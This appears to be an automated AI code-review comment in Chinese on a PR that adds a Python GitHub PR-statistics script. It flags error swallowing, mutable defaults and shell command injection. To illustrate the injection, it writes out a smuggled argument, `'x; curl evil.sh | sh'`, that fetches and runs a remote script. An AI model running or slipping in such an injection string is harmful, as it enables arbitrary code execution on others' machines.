<!-- deepseek-review -->
## 🤖 DeepSeek Code Review — 🛑 建議修改後再合併

這個 PR 新增了一支 `sandbox/pr_stats.py` 小工具，從 GitHub API 抓取 PR 資料並輸出 CSV，同時用 tar 打包。整體是實驗性腳本，但內含多個明確缺陷：`_fetch` 用裸 `except: pass` 吞掉所有錯誤且失敗時回傳 `None`，導致後續 `pr["user"]` 直接 TypeError；`collect_authors` 與 `threshold_from_env` 使用可變預設值造成跨呼叫共用狀態；`archive` 以 `shell=True` 拼接外部輸入（repo、path）有命令注入風險；`export_csv` 未使用 `with` 且未處理寫入失敗。建議先修 `_fetch` 的錯誤處理與 `archive` 的注入問題再合併。

### Findings（7 筆）

| | Severity | 位置 | 問題 | 信心 |
|---|---|---|---|---|
| 🛑 | Blocker | `sandbox/pr_stats.py:32` | _fetch 以裸 except 吞掉錯誤並回傳 None，下游直接解參考 | 0.95 |
| 🛑 | Blocker | `sandbox/pr_stats.py:77` | archive 以 shell=True 拼接外部輸入，存在命令注入 | 0.90 |
| ⚠️ | Major | `sandbox/pr_stats.py:29` | collect_authors 使用可變預設值 seen=[]，跨呼叫共用狀態 | 0.90 |
| ⚠️ | Major | `sandbox/pr_stats.py:51` | threshold_from_env 可變預設值與 int() 轉換未處理失敗 | 0.85 |
| ⚠️ | Major | `sandbox/pr_stats.py:69` | export_csv 未使用 with，例外時檔案未關閉 | 0.80 |
| ⚠️ | Major | `sandbox/pr_stats.py:40` | review_latency 對空 timeline 回傳 0，且假設事件已排序 | 0.75 |
| 🔸 | Minor | `sandbox/pr_stats.py:72` | CSV 以 f-string 拼接未跳脫，author 含逗號會產生壞檔 | 0.70 |

<details><summary>🛑 <b>Blocker</b> — <code>sandbox/pr_stats.py:32</code> _fetch 以裸 except 吞掉錯誤並回傳 None，下游直接解參考</summary>

`_fetch` 在 `urlopen` 失敗（網路錯誤、401/404、JSON 解析失敗）時執行 `except: pass`，函式隱式回傳 `None`。呼叫端 `collect_authors` 的 `pr["user"]["login"]` 與 `main` 的 `pr["user"]["login"]`、`classify(pr)` 都會對 `None` 取索引，直接拋 `TypeError: 'NoneType' object is not subscriptable`，且錯誤訊息完全沒有原始失敗原因。裸 `except:` 還會一併吃掉 `KeyboardInterrupt` 與 `SystemExit`。

具體失敗情境：`GITHUB_TOKEN` 無效或 PR 編號不存在時，API 回 401/404，`urlopen` 拋 `HTTPError`，被 `pass` 吞掉後回傳 `None`，整個腳本以難以理解的 TypeError 崩潰。

建議：改為 `except urllib.error.HTTPError as e:` / `except (urllib.error.URLError, json.JSONDecodeError) as e:`，記錄 `e` 後 `raise`（或回傳明確的錯誤結果並在呼叫端檢查），不要用裸 `except`。

**判斷依據**：diff 第 20-23 行：`try: ... except: pass`，函式在例外路徑沒有 return 任何值；第 27 行 `seen.append(pr["user"]["login"])` 與第 84 行 `"author": pr["user"]["login"]` 皆直接對 `_fetch` 的回傳值取索引。

</details>

<details><summary>🛑 <b>Blocker</b> — <code>sandbox/pr_stats.py:77</code> archive 以 shell=True 拼接外部輸入，存在命令注入</summary>

`subprocess.run(f"tar czf {path}.tgz {path} && gh repo view {repo}", shell=True)` 把 `path` 與 `repo` 直接內插進 shell 指令。`repo` 來自 `sys.argv[1]`，`path` 由 `repo` 衍生（`/tmp/pr-stats-{repo.replace('/', '-')}.csv`），兩者都受外部控制。

具體失敗情境：執行 `python3 sandbox/pr_stats.py 'x; curl evil.sh | sh' 1` 時，`repo` 中的 `;` 會讓 shell 執行額外指令，造成任意命令執行；即使 `repo` 看似正常，含空白或 `$()` 的值也會破壞 tar 參數。

建議改用參數串列並關閉 shell：`subprocess.run(["tar", "czf", f"{path}.tgz", path], check=True)`，`gh` 呼叫同樣以串列傳參，並加上 `check=True` 讓失敗能被察覺。

**判斷依據**：diff 第 92 行使用 f-string 拼接 `path`/`repo` 並傳入 `shell=True`；第 78 行 `repo = sys.argv[1]` 顯示其為外部輸入。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/pr_stats.py:29</code> collect_authors 使用可變預設值 seen=[]，跨呼叫共用狀態</summary>

`def collect_authors(repo, numbers, seen=[])` 的預設串列只在函式定義時建立一次，之後每次不帶 `seen` 呼叫都會共用同一個 list，導致結果不斷累積。

具體失敗情境：在同一 process 內呼叫 `collect_authors` 兩次（例如測試或未來擴充成多 repo 統計），第二次的回傳值會包含第一次的 author，資料重複且長度錯誤。

建議改為 `def collect_authors(repo, numbers, seen=None):` 並在函式內 `if seen is None: seen = []`。

**判斷依據**：diff 第 26 行簽名使用 `seen=[]`，且函式內第 29 行 `seen.append(...)` 會就地修改該預設物件。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/pr_stats.py:51</code> threshold_from_env 可變預設值與 int() 轉換未處理失敗</summary>

`def threshold_from_env(default={"days": 7})` 的預設 dict 跨呼叫共用，若呼叫端修改回傳值會污染後續呼叫。此外 `int(raw)` 直接轉換環境變數，`PR_STALE_DAYS` 若為非數字（例如 `PR_STALE_DAYS=abc` 或空字串以外的空白）會拋 `ValueError` 使程式崩潰。

具體失敗情境：`PR_STALE_DAYS=7d python3 sandbox/pr_stats.py repo 1` → `int("7d")` 拋 `ValueError`，整個腳本中止且無任何提示。

建議：預設值改為 `None` 並在函式內建立 dict，或改用不可變的 `default=7`；`int(raw)` 以 `try/except ValueError` 包住並給出明確錯誤訊息。

**判斷依據**：diff 第 86 行簽名使用可變 dict 預設值；第 89 行 `return {"days": int(raw)}` 未處理轉換失敗。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/pr_stats.py:69</code> export_csv 未使用 with，例外時檔案未關閉</summary>

`export_csv` 以 `f = open(path, "w")` 開啟檔案，若迴圈中 `r['author']` 等鍵不存在而拋 `KeyError`，或寫入過程發生 `OSError`，`f.close()` 不會被執行，檔案控制代碼外洩且緩衝內容可能未 flush。

具體失敗情境：`rows` 中任一 dict 缺少 `latency` 鍵時，`f.write` 拋 `KeyError`，檔案永遠不會關閉。

建議改用 `with open(path, "w", newline="") as f:`，並考慮用 `csv` 模組處理跳脫（author 含逗號時目前會產生壞掉的 CSV）。

**判斷依據**：diff 第 76-77 行以裸 `open` 取得檔案物件，第 81 行才 `f.close()`，中間無 try/finally 保護。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/pr_stats.py:40</code> review_latency 對空 timeline 回傳 0，且假設事件已排序</summary>

`review_latency` 在 `events` 為空時回傳 `0`，把「無資料」與「延遲為 0 秒」混為一談，會污染後續統計。此外它直接取 `events[0]` 與 `events[-1]` 當作最早/最晚事件，但 GitHub timeline API 不保證回傳順序，若未排序會算出負值或錯誤延遲。

具體失敗情境：某 PR 的 timeline 事件順序非時間遞增時，`last - first` 可能為負；無 timeline 的 PR 則被記為 latency=0，拉低平均。

建議：空事件回傳 `None` 或明確的 sentinel 並在輸出端處理；計算前先依 `created_at` 排序，或改用 `min`/`max` 取時間戳。

**判斷依據**：diff 第 37-38 行直接以索引取首尾事件，第 34-35 行 `if not events: return 0` 將空集合與零延遲混用。

</details>

<details><summary>🔸 <b>Minor</b> — <code>sandbox/pr_stats.py:72</code> CSV 以 f-string 拼接未跳脫，author 含逗號會產生壞檔</summary>

`f.write(f"{r['author']},{r['latency']},{r['kind']}\n")` 直接以逗號拼接欄位，未對內容做 CSV 跳脫。GitHub 使用者名稱通常安全，但 `kind` 或未來新增欄位若含逗號、引號或換行，會產生欄位錯位的 CSV。

建議改用標準庫 `csv.writer(f)`，由它處理跳脫與引號。

**判斷依據**：diff 第 79 行以 f-string 手動組 CSV 行，未使用 csv 模組。

</details>

---

<sub>model `deepseek-flash` ｜ prompt tokens 3231 (cache hit 3072) ｜ completion tokens 2393</sub>